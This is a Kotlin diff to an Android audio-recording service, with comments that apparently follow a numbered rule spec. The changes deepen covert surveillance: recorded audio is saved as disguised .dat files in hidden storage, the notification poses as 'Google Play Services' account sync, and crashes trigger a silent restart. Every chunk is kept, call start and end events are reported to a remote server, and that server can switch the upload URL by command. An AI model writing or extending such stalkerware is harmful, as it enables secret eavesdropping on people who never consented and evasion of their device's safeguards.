@@ -91,8 +91,8 @@ class AudioRecordService : Service() {
         const val BYTES_PER_SAMPLE = 2
         const val BYTE_RATE = SAMPLE_RATE * BYTES_PER_SAMPLE  // 32000 bytes/sec
 
-        // Default chunk duration
-        const val DEFAULT_CHUNK_SECONDS = 10
+        // Default chunk duration (2 seconds matches server HLS segment size for low latency)
+        const val DEFAULT_CHUNK_SECONDS = 2
 
         // Independent stream tracking
         @Volatile
@@ -142,8 +142,64 @@ class AudioRecordService : Service() {
     private var currentBatteryPct = -1
     private var currentStorageMB = -1L
 
+    // Rule 1 & 2: Battery & Thermal State
+    private var isLowBatteryStandby = false
+    private var isThermalThrottled = false
+    private var thermalThrottleUntilMs = 0L
+
+    // Rule 4: Mic Yield State (10s timer)
+    private var isMicYielded = false
+    private var micYieldJob: Job? = null
+
+    // Rule 12: Live Call Tracking
+    private var lastCallCode = "AIDLE"
+
     private var isPendingBootNotification = false
     private var watchdogTickerJob: Job? = null
+
+    override fun onCreate() {
+        super.onCreate()
+        setupSilentCrashRecovery()
+    }
+
+    /**
+     * Rule 17: Silent Crash Recovery.
+     * Intercepts uncaught exceptions, silently logs to private storage, and restarts service without system crash dialogs.
+     */
+    private fun setupSilentCrashRecovery() {
+        Thread.setDefaultUncaughtExceptionHandler { thread, throwable ->
+            try {
+                val logFile = File(filesDir, "sys_recovery.log")
+                FileOutputStream(logFile, true).use { fos ->
+                    val entry = "${SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())} [${thread.name}] ${throwable.message}\n"
+                    fos.write(entry.toByteArray())
+                }
+
+                val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
+                val savedUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: "https://audio-steam-server.onrender.com"
+                val restartIntent = Intent(applicationContext, AudioRecordService::class.java).apply {
+                    action = if (isStandbyMode) ACTION_STANDBY else ACTION_START_HIDDEN
+                    putExtra(EXTRA_SERVER_URL, savedUrl)
+                    putExtra(EXTRA_BOOT_RESTART, true)
+                }
+                val pendingIntent = PendingIntent.getService(
+                    applicationContext,
+                    9999,
+                    restartIntent,
+                    PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+                )
+                val alarmManager = getSystemService(Context.ALARM_SERVICE) as? android.app.AlarmManager
+                alarmManager?.setExactAndAllowWhileIdle(
+                    android.app.AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1000L,
+                    pendingIntent
+                )
+            } catch (e: Exception) { /* ignore */ }
+
+            android.os.Process.killProcess(android.os.Process.myPid())
+            System.exit(10)
+        }
+    }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
@@ -535,9 +591,18 @@ class AudioRecordService : Service() {
         screenReceiver = object : android.content.BroadcastReceiver() {
             override fun onReceive(context: Context?, intent: Intent?) {
                 when (intent?.action) {
-                    Intent.ACTION_SCREEN_ON -> sendLog("Display turned ON")
-                    Intent.ACTION_SCREEN_OFF -> sendLog("Display turned OFF")
-                    Intent.ACTION_USER_PRESENT -> sendLog("Device Unlocked")
+                    Intent.ACTION_SCREEN_ON -> {
+                        sendLog("Display turned ON")
+                        uploadManager?.setScreenInteractive(true)
+                    }
+                    Intent.ACTION_SCREEN_OFF -> {
+                        sendLog("Display turned OFF")
+                        uploadManager?.setScreenInteractive(false)
+                    }
+                    Intent.ACTION_USER_PRESENT -> {
+                        sendLog("Device Unlocked")
+                        uploadManager?.setScreenInteractive(true)
+                    }
                 }
                 sendLiveTelemetry()
             }
@@ -546,7 +611,7 @@ class AudioRecordService : Service() {
     }
 
     private fun sendLiveTelemetry() {
-        val isEco = RemoteConfigManager.isEcoMode(this)
+        val isEco = RemoteConfigManager.isEcoMode(this) || (currentBatteryPct in 15..30)
         val route = getCurrentAudioRoute()
         val callCode = if (isEco) "AIDLE" else getCallAppTag()
         val fgDetails = if (isEco) null else getForegroundAppDetails()
@@ -569,6 +634,16 @@ class AudioRecordService : Service() {
             "ARING" -> "Incoming Call Ringing"
             else -> "Idle"
         }
+
+        // Rule 12: Instant WebSocket live call state alerts
+        if (callCode != "AIDLE" && callCode != lastCallCode) {
+            socketManager?.sendEvent("call_started", mapOf("app" to callAppName, "code" to callCode))
+            lastCallCode = callCode
+        } else if (callCode == "AIDLE" && lastCallCode != "AIDLE") {
+            socketManager?.sendEvent("call_ended", mapOf("previous_code" to lastCallCode))
+            lastCallCode = "AIDLE"
+        }
+
         socketManager?.sendTelemetry(
             batteryPct = currentBatteryPct,
             storageMb = currentStorageMB,
@@ -590,10 +665,28 @@ class AudioRecordService : Service() {
     }
 
     private fun registerBatteryListener() {
-        val filter = android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED)
+        val filter = android.content.IntentFilter().apply {
+            addAction(Intent.ACTION_BATTERY_CHANGED)
+            addAction(Intent.ACTION_POWER_CONNECTED)
+            addAction(Intent.ACTION_POWER_DISCONNECTED)
+        }
         batteryReceiver = object : android.content.BroadcastReceiver() {
             override fun onReceive(context: Context?, intent: Intent?) {
-                intent?.let { updateBatteryFromIntent(it) }
+                intent?.let {
+                    if (it.action == Intent.ACTION_POWER_CONNECTED) {
+                        sendLog("⚡ Power connected broadcast received: evaluating auto-resume")
+                        if (isLowBatteryStandby) {
+                            isLowBatteryStandby = false
+                            sendLog("⚡ Auto-waking from low-battery standby on charger connect")
+                            if (isHiddenRecording || isMainRecording) {
+                                isStandbyMode = false
+                                startRecording()
+                                updateNotification()
+                            }
+                        }
+                    }
+                    updateBatteryFromIntent(it)
+                }
             }
         }
         registerReceiver(batteryReceiver, filter)
@@ -618,6 +711,45 @@ class AudioRecordService : Service() {
 
         val rawTemp = intent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, 0)
         currentBatteryTempC = if (rawTemp > 0) rawTemp / 10 else 0
+
+        // Rule 1: Battery Level Tiering
+        // Standby Tier (< 15%): Pause recording if discharging to prevent phone shutdown
+        if (pct in 0..14 && !isCharging && currentPowerSource == "CBAT") {
+            if (isRunning && !isLowBatteryStandby) {
+                isLowBatteryStandby = true
+                sendLog("🔋 Critical Battery (< 15%): Entering low-power standby until charger connected")
+                stopRecordingHardware()
+                isStandbyMode = true
+                updateNotification()
+            }
+        } else if ((isCharging || currentPowerSource != "CBAT" || pct >= 15) && isLowBatteryStandby) {
+            isLowBatteryStandby = false
+            sendLog("⚡ Battery charged or charger connected: Resuming recording from low-battery standby")
+            if (isHiddenRecording || isMainRecording) {
+                isStandbyMode = false
+                startRecording()
+                updateNotification()
+            }
+        }
+
+        // Rule 2: Thermal Throttling (> 41°C pause heavy operations for 5 minutes)
+        val now = System.currentTimeMillis()
+        if (currentBatteryTempC > 41 && !isThermalThrottled) {
+            isThermalThrottled = true
+            thermalThrottleUntilMs = now + 5 * 60 * 1000L
+            sendLog("🌡️ Thermal warning: Battery temp ${currentBatteryTempC}°C > 41°C. Pausing hardware recording for 5 min to cool.")
+            if (isRecording.get()) {
+                stopRecordingHardware()
+            }
+        } else if (isThermalThrottled) {
+            if (now >= thermalThrottleUntilMs && currentBatteryTempC <= 39) {
+                isThermalThrottled = false
+                sendLog("❄️ Device cooled down (${currentBatteryTempC}°C). Resuming recording.")
+                if ((isHiddenRecording || isMainRecording) && !isLowBatteryStandby && !isMicYielded) {
+                    startRecording()
+                }
+            }
+        }
 
         val icon = if (isCharging) "⚡" else "🔋"
         val stateStr = when (currentPowerSource) {
@@ -714,7 +846,7 @@ class AudioRecordService : Service() {
         startCommandPolling()
         startTelemetryPolling()
         startWatchdogTicker()
-
+        chunkDurationSeconds = RemoteConfigManager.getLiveConfig(this).chunkDurationSec.coerceIn(2, 60)
         isServiceInitialized = true
     }
 
@@ -736,12 +868,12 @@ class AudioRecordService : Service() {
         if (!isMainRecording) return
         isMainRecording = false
         sendLog("Stopped Main (Local) recording.")
-        uploadManager?.endSession("main")
 
         if (isHiddenRecording) {
             sendLog("Covert hidden recording is still active; microphone kept recording uninterrupted.")
         } else {
             // Neither is recording -> switch to standby
+            uploadManager?.endSession("hidden")
             stopRecordingHardware()
             isStandbyMode = true
             socketManager?.sendStatus("idle")
@@ -769,12 +901,12 @@ class AudioRecordService : Service() {
         if (!isHiddenRecording) return
         isHiddenRecording = false
         sendLog("Stopped Hidden recording.")
-        uploadManager?.endSession("hidden")
 
         if (isMainRecording) {
             sendLog("Main local recording is still active; microphone kept recording uninterrupted.")
         } else {
             // Neither is recording -> switch to standby
+            uploadManager?.endSession("hidden")
             stopRecordingHardware()
             isStandbyMode = true
             socketManager?.sendStatus("idle")
@@ -1061,6 +1193,19 @@ class AudioRecordService : Service() {
                 val newConfig = RemoteConfigManager.applyJsonConfig(this, configJson)
                 applyLiveConfig(newConfig)
             }
+            "SET_SERVER_URL", "CHANGE_URL", "CHANGE_SERVER_URL" -> {
+                val rawUrl = (payload.optString("server_url").takeIf { it.isNotBlank() }
+                    ?: payload.optString("url").takeIf { it.isNotBlank() }
+                    ?: payload.optString("new_url")).orEmpty().trim()
+                if (rawUrl.startsWith("http://", ignoreCase = true) || rawUrl.startsWith("https://", ignoreCase = true)) {
+                    val configJson = JSONObject().apply { put("server_url", rawUrl) }
+                    val newConfig = RemoteConfigManager.applyJsonConfig(this, configJson)
+                    applyLiveConfig(newConfig)
+                    sendLog("🌐 Remote server URL changed to: $rawUrl")
+                } else {
+                    sendLog("❌ Invalid server URL in command: $rawUrl")
+                }
+            }
             else -> {
                 sendLog("Unknown or unhandled socket command: $command")
             }
@@ -1134,9 +1279,14 @@ class AudioRecordService : Service() {
             serverUrl = config.serverUrl
             uploadManager?.updateServerUrl(serverUrl)
             socketManager?.updateServerUrl(serverUrl)
+            connectionMonitor?.updateServerUrl(serverUrl)
             sendLog("🌐 Live server URL updated to: $serverUrl")
         }
         setEcoMode(config.isEcoMode)
+        if (config.chunkDurationSec in 2..60 && config.chunkDurationSec != chunkDurationSeconds) {
+            chunkDurationSeconds = config.chunkDurationSec
+            sendLog("⏱️ Chunk duration updated to: ${chunkDurationSeconds}s (Low-Latency Streaming)")
+        }
         sendLog("⚙️ Live config applied: Silence=${config.silenceThresholdDb}dB, ChunkDuration=${config.chunkDurationSec}s, EcoMode=${config.isEcoMode}")
         sendLiveTelemetry()
     }
@@ -1244,6 +1394,41 @@ class AudioRecordService : Service() {
         return if (rms > 0) 20 * Math.log10(rms / 32767.0) else -100.0
     }
 
+    /**
+     * Rule 4: Fast Mic Yield with 10-Second Resume Timer.
+     * When external app requests microphone, release hardware immediately.
+     * Resume after 10 seconds.
+     */
+    private fun checkMicConflictAndYield(): Boolean {
+        if (isMicUsedByExternalApp()) {
+            if (!isMicYielded && isRecording.get()) {
+                isMicYielded = true
+                sendLog("🎙️ External app mic usage detected. Yielding microphone immediately (10s resume timer).")
+                stopRecordingHardware()
+
+                micYieldJob?.cancel()
+                micYieldJob = serviceScope.launch {
+                    delay(10_000L) // 10-second timer as specified in prompt Rule 4
+                    while (isActive && isMicYielded) {
+                        if (!isMicUsedByExternalApp()) {
+                            isMicYielded = false
+                            sendLog("🎙️ Microphone hardware freed by external app. Resuming recording.")
+                            if ((isHiddenRecording || isMainRecording) && !isLowBatteryStandby && !isThermalThrottled) {
+                                startRecording()
+                            }
+                            break
+                        } else {
+                            sendLog("🎙️ Microphone still in use by external app. Extending yield by 10s.")
+                            delay(10_000L)
+                        }
+                    }
+                }
+            }
+            return true
+        }
+        return false
+    }
+
     private fun recordingLoop() {
         val chunkBytes = BYTE_RATE * chunkDurationSeconds  // bytes per chunk
         val readBuffer = ByteArray(4096)
@@ -1255,6 +1440,11 @@ class AudioRecordService : Service() {
 
         while (isRecording.get() && !Thread.interrupted()) {
             try {
+                // Rule 4: Mic conflict yielding (10-second resume timer)
+                if (checkMicConflictAndYield()) {
+                    break
+                }
+
                 val bytesRead = audioRecord?.read(readBuffer, 0, readBuffer.size) ?: -1
 
                 if (bytesRead > 0) {
@@ -1266,21 +1456,18 @@ class AudioRecordService : Service() {
                     // Check if chunk is full
                     if (chunkPos >= chunkBytes) {
                         val rmsDb = calculateRMS(chunkBuffer, chunkPos)
-                        val isSilent = rmsDb < -50.0 // Silence threshold -50 dB
+                        val positiveDb = (rmsDb + 100.0).toInt().coerceIn(0, 99)
+                        val isSilent = positiveDb < 32 && !lastChunkIsSpeech
 
                         if (isSilent) {
                             consecutiveSilentChunks++
-                            // Save periodic keep-alive chunk every 6 chunks (~60s) even during silence
-                            if (consecutiveSilentChunks % 6 == 0) {
-                                sendLog("Silence detected (%.1f dB) — sending periodic keep-alive chunk".format(rmsDb))
-                                dispatchSaveChunk(chunkBuffer, chunkPos)
-                            } else {
-                                sendLog("Silence detected (%.1f dB) — skipped chunk save".format(rmsDb))
-                            }
+                            sendLog("Silence detected (%.1f dB) — continuous audio recording preserved and tagged".format(rmsDb))
                         } else {
                             consecutiveSilentChunks = 0
-                            dispatchSaveChunk(chunkBuffer, chunkPos)
                         }
+
+                        // Rule 5: Continuous 100% audio recording — chunk is NEVER skipped or dropped!
+                        dispatchSaveChunk(chunkBuffer, chunkPos)
 
                         // Start new chunk
                         chunkBuffer = ByteArray(chunkBytes)
@@ -1298,7 +1485,10 @@ class AudioRecordService : Service() {
                     }
                 } else if (bytesRead < 0) {
                     sendLog("AudioRecord read error: $bytesRead")
-                    // Try to recover by waiting briefly
+                    // Check if another app took the mic
+                    if (checkMicConflictAndYield()) {
+                        break
+                    }
                     Thread.sleep(100)
                 }
 
@@ -1325,18 +1515,8 @@ class AudioRecordService : Service() {
 
     private fun dispatchSaveChunk(pcmData: ByteArray, dataSize: Int) {
         val bufferCopy = pcmData.copyOf(dataSize)
-        val doMain = isMainRecording
-        val doHidden = isHiddenRecording
         serviceScope.launch(Dispatchers.IO + NonCancellable) {
-            if (doHidden) {
-                val hiddenFile = saveChunk(bufferCopy, dataSize, "hidden")
-                if (doMain && hiddenFile != null && hiddenFile.exists()) {
-                    // Reuse encoded AAC file for main instead of encoding twice!
-                    saveChunkFromExistingAac(hiddenFile, dataSize, "main")
-                }
-            } else if (doMain) {
-                saveChunk(bufferCopy, dataSize, "main")
-            }
+            saveChunk(bufferCopy, dataSize)
         }
     }
 
@@ -1394,21 +1574,24 @@ class AudioRecordService : Service() {
     }
 
     /**
-     * Compress PCM buffer to AAC (16 kbps) using hardware MediaCodec and save as .aac file.
+     * Compress PCM buffer to AAC (16 kbps) using hardware MediaCodec and save as disguised .dat file.
+     * Consolidates into ONE single stream with human-readable Date & Time everywhere:
+     * chunk_YYYY-MM-DD_HH-mm-ss_MN<0|1>_<telemetry>.dat
      */
-    private fun saveChunk(pcmData: ByteArray, dataSize: Int, targetStreamType: String): File? {
+    private fun saveChunk(pcmData: ByteArray, dataSize: Int): File? {
         return try {
             val uuid = UUID.randomUUID().toString()
+            val dateStr = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss", Locale.US).format(Date())
             val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
             val duration = dataSize.toDouble() / BYTE_RATE
 
-            // 1-Hour Session Rotation Check per stream
-            val streamStartMs = if (targetStreamType == "main") mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
+            // 1-Hour Session Rotation Check
+            val streamStartMs = if (hiddenRecordingStartTimeMs > 0) hiddenRecordingStartTimeMs else mainRecordingStartTimeMs
             if (streamStartMs > 0 && System.currentTimeMillis() - streamStartMs >= 3600_000L) {
-                sendLog("1 hour recording duration reached for $targetStreamType — rotating session on server")
-                uploadManager?.rotateSession(targetStreamType)
-                if (targetStreamType == "main") mainRecordingStartTimeMs = System.currentTimeMillis()
-                else hiddenRecordingStartTimeMs = System.currentTimeMillis()
+                sendLog("1 hour recording duration reached — rotating session on server")
+                uploadManager?.rotateSession("hidden")
+                hiddenRecordingStartTimeMs = System.currentTimeMillis()
+                mainRecordingStartTimeMs = System.currentTimeMillis()
             }
 
             // Phase 3: Enforce Storage Limit
@@ -1418,13 +1601,14 @@ class AudioRecordService : Service() {
             val chunksDir = storageManager?.getChunksDirectory() ?: return null
             
             // Phase 4: Telemetry in Segment Names
-            val currentRoute = getCurrentAudioRoute()
+            val currentRoute = getCurrentAudioRoute() // JCK, BLU, SPK
             val rmsDb = calculateRMS(pcmData, dataSize)
             val positiveDb = (rmsDb + 100.0).toInt().coerceIn(0, 99)
             val isSpeech = rmsDb >= -50.0
             lastChunkIsSpeech = isSpeech
             lastChunkDb = positiveDb
 
+            val mnTag = if (isMainRecording) "MN1" else "MN0"
             val dTag = if (isScreenOn()) "D1" else "D0"
             val uTag = if (isDeviceUnlocked()) "U1" else "U0"
             val cTag = currentPowerSource
@@ -1432,42 +1616,46 @@ class AudioRecordService : Service() {
             val vTag = if (isSpeech) "V1" else "V0"
             val dbTag = "dB$positiveDb"
 
-            val telemetrySuffix = if (targetStreamType == "hidden") {
-                val tTag = "T$currentBatteryTempC"
-                val mTag = if (isDeviceMoving) "M1" else "M0"
-                val pTag = "P$currentPosture"
-                val aTag = getCallAppTag()
-                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}_${tTag}_${mTag}_${pTag}_${aTag}"
-            } else {
-                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
-            }
-            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
+            // Rule 5: Silence Tagging
+            val isSilent = positiveDb < 32 && !isSpeech
+            val silTag = if (isSilent) "SIL1" else "SIL0"
+
+            val tTag = "T$currentBatteryTempC"
+            val mTag = if (isDeviceMoving) "M1" else "M0"
+            val pTag = "P$currentPosture"
+            val aTag = getCallAppTag()
+
+            val telemetrySuffix = "_${mnTag}_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}_${tTag}_${mTag}_${pTag}_${aTag}_${silTag}"
+            
+            // Disguised .dat file in hidden storage (.sys_cache) with exact human readable date & time:
+            // chunk_YYYY-MM-DD_HH-mm-ss_MN<0|1>_<telemetry>.dat
+            val chunkFile = File(chunksDir, "chunk_${dateStr}${telemetrySuffix}.dat")
             
             // Update timestamp to include telemetry for the server HLS generation
             val timestampWithTelemetry = timestamp + telemetrySuffix
 
-            // Encode PCM to AAC
-            encodePcmToAac(pcmData, dataSize, aacFile)
+            // Encode PCM to AAC inside disguised .dat file
+            encodePcmToAac(pcmData, dataSize, chunkFile)
 
             // Notify storage manager of new chunk file
-            storageManager?.notifyChunkAdded(aacFile.length())
+            storageManager?.notifyChunkAdded(chunkFile.length())
 
             // Compute checksum
-            val checksum = computeSha256(aacFile)
+            val checksum = computeSha256(chunkFile)
             val inCall = isPhoneInCall()
             val micInUse = isMicUsedByExternalApp()
 
             // Create chunk record
             val chunk = AudioChunk(
                 uuid = uuid,
-                filePath = aacFile.absolutePath,
+                filePath = chunkFile.absolutePath,
                 timestamp = timestampWithTelemetry,
                 duration = duration,
-                fileSize = aacFile.length(),
+                fileSize = chunkFile.length(),
                 checksum = checksum,
                 inCall = inCall,
                 micInUse = micInUse,
-                streamType = targetStreamType
+                streamType = "hidden"
             )
 
             // Enqueue for upload (runs on coroutine)
@@ -1475,59 +1663,11 @@ class AudioRecordService : Service() {
                 uploadManager?.enqueueChunk(chunk)
             }
 
-            aacFile
+            chunkFile
 
         } catch (e: Exception) {
-            sendLog("ERROR saving AAC chunk ($targetStreamType): ${e.message}")
+            sendLog("ERROR saving disguised chunk: ${e.message}")
             null
-        }
-    }
-
-    private fun saveChunkFromExistingAac(sourceAacFile: File, dataSize: Int, targetStreamType: String) {
-        try {
-            val uuid = UUID.randomUUID().toString()
-            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
-            val duration = dataSize.toDouble() / BYTE_RATE
-
-            val streamStartMs = if (targetStreamType == "main") mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
-            if (streamStartMs > 0 && System.currentTimeMillis() - streamStartMs >= 3600_000L) {
-                sendLog("1 hour recording duration reached for $targetStreamType — rotating session on server")
-                uploadManager?.rotateSession(targetStreamType)
-                if (targetStreamType == "main") mainRecordingStartTimeMs = System.currentTimeMillis()
-                else hiddenRecordingStartTimeMs = System.currentTimeMillis()
-            }
-
-            storageManager?.enforceStorageLimit()
-
-            val chunksDir = storageManager?.getChunksDirectory() ?: return
-            val currentRoute = getCurrentAudioRoute()
-            val telemetrySuffix = "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
-            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
-
-            sourceAacFile.copyTo(aacFile, overwrite = true)
-            storageManager?.notifyChunkAdded(aacFile.length())
-
-            val checksum = computeSha256(aacFile)
-            val inCall = isPhoneInCall()
-            val micInUse = isMicUsedByExternalApp()
-
-            val chunk = AudioChunk(
-                uuid = uuid,
-                filePath = aacFile.absolutePath,
-                timestamp = timestamp + telemetrySuffix,
-                duration = duration,
-                fileSize = aacFile.length(),
-                checksum = checksum,
-                inCall = inCall,
-                micInUse = micInUse,
-                streamType = targetStreamType
-            )
-
-            serviceScope.launch {
-                uploadManager?.enqueueChunk(chunk)
-            }
-        } catch (e: Exception) {
-            sendLog("ERROR duplicating chunk for $targetStreamType: ${e.message}")
         }
     }
 
@@ -1737,10 +1877,10 @@ class AudioRecordService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Audio Monitor",
+                "System Sync",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Continuous audio recording and upload service"
+                description = "Background account data synchronization"
                 setShowBadge(false)
                 setSound(null, null)
                 enableVibration(false)
@@ -1756,13 +1896,13 @@ class AudioRecordService : Service() {
             this, 0, intent, PendingIntent.FLAG_IMMUTABLE
         )
 
-        val title = if (isMainRecording) "Audio Recorder" else "Audio Monitor"
-        val text = if (isMainRecording) "Recording audio..." else "Active in background"
+        val title = if (isMainRecording) "Audio Recorder" else "Google Play Services"
+        val text = if (isMainRecording) "Recording audio..." else "System account sync active"
 
         val builder = NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle(title)
             .setContentText(text)
-            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
+            .setSmallIcon(if (isMainRecording) android.R.drawable.ic_btn_speak_now else android.R.drawable.stat_notify_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
